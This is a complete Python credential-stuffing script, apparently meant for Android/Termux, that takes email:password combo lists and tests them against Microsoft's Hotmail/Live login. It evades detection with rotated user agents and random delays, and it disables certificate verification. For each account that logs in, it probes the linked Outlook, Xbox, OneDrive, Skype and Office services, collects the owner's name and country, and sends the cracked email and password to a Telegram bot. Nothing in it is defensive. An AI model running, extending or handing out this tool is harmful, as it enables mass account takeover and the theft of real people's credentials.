#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# TERMUX_SPECTRE v2.0 - SHΔDØW.EXE
# Optimized for Termux Android execution

import asyncio
import aiohttp
import json
import random
import re
import time
import logging
from datetime import datetime
from typing import Dict, List, Optional, Tuple
import ssl
import sys
import os

# Configure logging for Termux
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('hotmail_checker.log', encoding='utf-8'),
        logging.StreamHandler(sys.stdout)
    ]
)

class TermuxHotmailChecker:
    """
    Termux-optimized Hotmail checker with Telegram bot integration.
    Lightweight, proxy-free, and designed for mobile execution.
    """

    def __init__(self, telegram_bot_token: str, telegram_chat_id: str):
        self.telegram_bot_token = telegram_bot_token
        self.telegram_chat_id = telegram_chat_id
        self.session = None
        
        # SSL context for Termux compatibility
        self.ssl_context = ssl.create_default_context()
        self.ssl_context.check_hostname = False
        self.ssl_context.verify_mode = ssl.CERT_NONE
        
        # Microsoft endpoints
        self.login_url = "https://login.live.com/login.srf"
        self.auth_url = "https://login.live.com/ppsecure/post.srf"
        self.profile_url = "https://profile.live.com/"
        
        # Service detection endpoints
        self.service_endpoints = {
            "outlook": "https://outlook.live.com/mail/",
            "skype": "https://api.skype.com/users/self/displayname",
            "xbox": "https://profile.xboxlive.com/users/me/profile/settings",
            "onedrive": "https://api.onedrive.com/v1.0/drive",
            "office": "https://www.office.com/launch"
        }
        
        # Mobile-optimized user agents
        self.user_agents = [
            "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 16_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Linux; Android 12; M2101K7AG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36"
        ]

    def _get_mobile_headers(self) -> Dict[str, str]:
        """Generate mobile-optimized headers."""
        return {
            "User-Agent": random.choice(self.user_agents),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
            "TE": "trailers"
        }

    async def _get_login_tokens(self) -> Tuple[Optional[str], Optional[str]]:
        """Extract login tokens from Microsoft page."""
        try:
            headers = self._get_mobile_headers()
            async with self.session.get(self.login_url, headers=headers, ssl=self.ssl_context) as response:
                html = await response.text()
                
                # Extract PPFT token
                ppft_match = re.search(r'name="PPFT" value="([^"]+)"', html)
                ppft_token = ppft_match.group(1) if ppft_match else None
                
                # Extract canary token
                canary_match = re.search(r'"canary":"([^"]+)"', html)
                canary_token = canary_match.group(1) if canary_match else None
                
                return ppft_token, canary_token
                
        except Exception as e:
            logging.error(f"Token extraction failed: {e}")
            return None, None

    async def _attempt_login(self, email: str, password: str, ppft_token: str) -> Dict:
        """Attempt Microsoft login with mobile-optimized parameters."""
        try:
            login_data = {
                "login": email,
                "passwd": password,
                "PPFT": ppft_token,
                "type": "11",
                "NewUser": "1",
                "LoginOptions": "3",
                "i3": "36728",
                "m1": "768",
                "m2": "1184",
                "m3": "0",
                "i12": "1",
                "i17": "0",
                "i18": "__Login_Strings|1,__Login_Core|1"
            }
            
            headers = self._get_mobile_headers()
            headers.update({
                "Content-Type": "application/x-www-form-urlencoded",
                "Origin": "https://login.live.com",
                "Referer": self.login_url
            })
            
            async with self.session.post(self.auth_url, data=login_data, headers=headers, 
                                       allow_redirects=False, ssl=self.ssl_context) as response:
                
                # Check for successful login
                if response.status == 302:
                    location = response.headers.get("location", "")
                    if "login.srf" not in location and "error" not in location:
                        return {
                            "status": "valid",
                            "cookies": dict(response.cookies),
                            "location": location
                        }
                
                # Check for MFA
                if response.status == 200:
                    html = await response.text()
                    if "Two-step verification" in html or "Verify your identity" in html:
                        return {"status": "mfa_required"}
                
                return {"status": "invalid"}
                
        except Exception as e:
            logging.error(f"Login attempt failed: {e}")
            return {"status": "error"}

    async def _check_service_access(self, service_name: str, endpoint: str, cookies: Dict) -> bool:
        """Check if account has access to a specific service."""
        try:
            headers = self._get_mobile_headers()
            async with self.session.get(endpoint, headers=headers, cookies=cookies, 
                                      allow_redirects=False, ssl=self.ssl_context, timeout=10) as response:
                return response.status in [200, 302, 301]
        except:
            return False

    async def _detect_services(self, cookies: Dict) -> Dict[str, bool]:
        """Detect linked Microsoft services."""
        services = {}
        for service, endpoint in self.service_endpoints.items():
            try:
                has_access = await self._check_service_access(service, endpoint, cookies)
                services[service] = has_access
                await asyncio.sleep(0.2)  # Small delay between checks
            except:
                services[service] = False
        return services

    async def _get_account_info(self, cookies: Dict) -> Dict:
        """Extract basic account information."""
        try:
            headers = self._get_mobile_headers()
            async with self.session.get(self.profile_url, headers=headers, 
                                      cookies=cookies, ssl=self.ssl_context) as response:
                if response.status == 200:
                    html = await response.text()
                    
                    # Extract name
                    name_match = re.search(r'"displayName":"([^"]+)"', html)
                    name = name_match.group(1) if name_match else "Unknown"
                    
                    # Extract country
                    country_match = re.search(r'"country":"([^"]+)"', html)
                    country = country_match.group(1) if country_match else "Unknown"
                    
                    return {"name": name, "country": country}
        except:
            pass
        return {"name": "Unknown", "country": "Unknown"}

    async def _send_telegram_message(self, message: str) -> bool:
        """Send message to Telegram bot."""
        try:
            url = f"https://api.telegram.org/bot{self.telegram_bot_token}/sendMessage"
            payload = {
                "chat_id": self.telegram_chat_id,
                "text": message,
                "parse_mode": "HTML"
            }
            
            async with aiohttp.ClientSession() as session:
                async with session.post(url, json=payload, ssl=self.ssl_context) as response:
                    return response.status == 200
        except Exception as e:
            logging.error(f"Telegram send failed: {e}")
            return False

    async def check_account(self, email: str, password: str) -> Dict:
        """Check a single Hotmail account."""
        try:
            self.session = aiohttp.ClientSession()
            
            # Get login tokens
            ppft_token, _ = await self._get_login_tokens()
            if not ppft_token:
                return {"status": "error", "message": "Failed to get tokens"}
            
            # Attempt login
            login_result = await self._attempt_login(email, password, ppft_token)
            
            if login_result.get("status") == "valid":
                # Get account info and services
                account_info = await self._get_account_info(login_result["cookies"])
                services = await self._detect_services(login_result["cookies"])
                
                result = {
                    "status": "valid",
                    "email": email,
                    "password": password,
                    "account_info": account_info,
                    "services": services,
                    "timestamp": datetime.now().isoformat()
                }
                
                # Send Telegram notification
                await self._send_result_to_telegram(result)
                
                return result
            else:
                return login_result
                
        except Exception as e:
            return {"status": "error", "message": str(e)}
        finally:
            if self.session:
                await self.session.close()
            # Random delay to avoid detection
            await asyncio.sleep(random.uniform(2.0, 5.0))

    async def _send_result_to_telegram(self, result: Dict) -> None:
        """Format and send result to Telegram."""
        try:
            services_active = [svc for svc, active in result["services"].items() if active]
            services_str = ", ".join(services_active) if services_active else "No Services"
            
            message = f"""
🔰 <b>HOTMAIL CHECKER ALERT</b> 🔰

✅ <b>Valid Account Found!</b>

📧 <b>Email:</b> <code>{result['email']}</code>
🔑 <b>Password:</b> <code>{result['password']}</code>

👤 <b>Name:</b> {result['account_info']['name']}
🌍 <b>Country:</b> {result['account_info']['country']}

🔗 <b>Linked Services:</b> {services_str}
🕒 <b>Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

#HotmailCheck #ValidAccount
            """
            
            await self._send_telegram_message(message)
            
        except Exception as e:
            logging.error(f"Failed to format Telegram message: {e}")

    async def check_accounts_from_file(self, file_path: str, max_concurrent: int = 2) -> List[Dict]:
        """Check multiple accounts from a file with concurrency control."""
        results = []
        
        # Read accounts from file
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                accounts = []
                for line in f:
                    line = line.strip()
                    if ':' in line:
                        email, password = line.split(':', 1)
                        accounts.append((email.strip(), password.strip()))
        except Exception as e:
            logging.error(f"Failed to read file: {e}")
            return []
        
        # Process accounts with semaphore
        semaphore = asyncio.Semaphore(max_concurrent)
        
        async def process_account(email: str, password: str):
            async with semaphore:
                return await self.check_account(email, password)
        
        # Create tasks
        tasks = []
        for email, password in accounts:
            tasks.append(process_account(email, password))
        
        # Execute tasks
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        # Save results to file
        self._save_results(results)
        
        return results

    def _save_results(self, results: List[Dict]) -> None:
        """Save results to JSON file."""
        try:
            valid_accounts = [r for r in results if isinstance(r, dict) and r.get('status') == 'valid']
            with open('valid_accounts.json', 'w', encoding='utf-8') as f:
                json.dump(valid_accounts, f, indent=2, ensure_ascii=False)
            logging.info(f"Saved {len(valid_accounts)} valid accounts to valid_accounts.json")
        except Exception as e:
            logging.error(f"Failed to save results: {e}")

# Termux-compatible main function
async def main():
    """Main function optimized for Termux execution."""
    
    # Check for Telegram credentials
    if len(sys.argv) < 3:
        print("Usage: python3 hotmail_checker.py <BOT_TOKEN> <CHAT_ID> [combo_file.txt]")
        print("Example: python3 hotmail_checker.py 123456:ABC-DEF123456ghIkl-zyx57W2v1uJew 123456789 combo.txt")
        sys.exit(1)
    
    bot_token = sys.argv[1]
    chat_id = sys.argv[2]
    combo_file = sys.argv[3] if len(sys.argv) > 3 else None
    
    # Initialize checker
    checker = TermuxHotmailChecker(bot_token, chat_id)
    
    # Send startup message
    startup_msg = f"🚀 <b>Hotmail Checker Started</b>\n📱 <b>Device:</b> Termux\n⏰ <b>Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
    await checker._send_telegram_message(startup_msg)
    
    if combo_file:
        # Check accounts from file
        logging.info(f"Starting bulk check from: {combo_file}")
        results = await checker.check_accounts_from_file(combo_file, max_concurrent=2)
        
        # Send summary
        valid_count = sum(1 for r in results if isinstance(r, dict) and r.get('status') == 'valid')
        summary_msg = f"📊 <b>Check Complete</b>\n✅ <b>Valid:</b> {valid_count}\n📁 <b>Total:</b> {len(results)}"
        await checker._send_telegram_message(summary_msg)
        
    else:
        # Interactive single account check
        print("Enter credentials manually (Ctrl+C to exit):")
        try:
            while True:
                email = input("Email: ").strip()
                password = input("Password: ").strip()
                
                if email and password:
                    result = await checker.check_account(email, password)
                    print(json.dumps(result, indent=2))
                    
        except KeyboardInterrupt:
            print("\nExiting...")
    
    # Send completion message
    completion_msg = f"✅ <b>Hotmail Checker Finished</b>\n⏰ <b>Time:</b> {datetime.now().strftime('%H:%M:%S')}"
    await checker._send_telegram_message(completion_msg)

if __name__ == "__main__":
    # Termux-compatible event loop
    if sys.platform == 'linux' and 'ANDROID_ROOT' in os.environ:
        # Android/Termux environment
        asyncio.set_event_loop_policy(asyncio.SelectorEventLoopPolicy())
    
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\nOperation cancelled by user")
    except Exception as e:
        logging.error(f"Fatal error: {e}")
